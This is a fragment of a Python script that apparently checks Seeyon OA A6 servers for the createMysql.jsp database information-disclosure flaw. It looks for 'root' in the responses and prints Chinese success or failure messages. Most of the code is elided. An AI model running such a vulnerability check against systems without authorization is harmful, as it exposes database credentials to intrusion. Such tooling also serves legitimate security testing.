...
def main(target_url):
    ...
    try:
        ...
        if 'root' in response.text and response.status_code == 200:
            print(now_time() + " [SUCCESS]  致远OA A6 存在敏感信息泄露,地址为:{}".format(vuln_url))
        elif 'root' in response2.text and response2.status_code == 200:
            print(now_time() + " [SUCCESS]  致远OA A6 存在敏感信息泄露,地址为:{}".format(vuln_url2))
        else:
            print(now_time() + " [WARNING]  致远OA A6 createMysql.jsp 数据库敏感信息泄露漏洞利用失败")
    except:
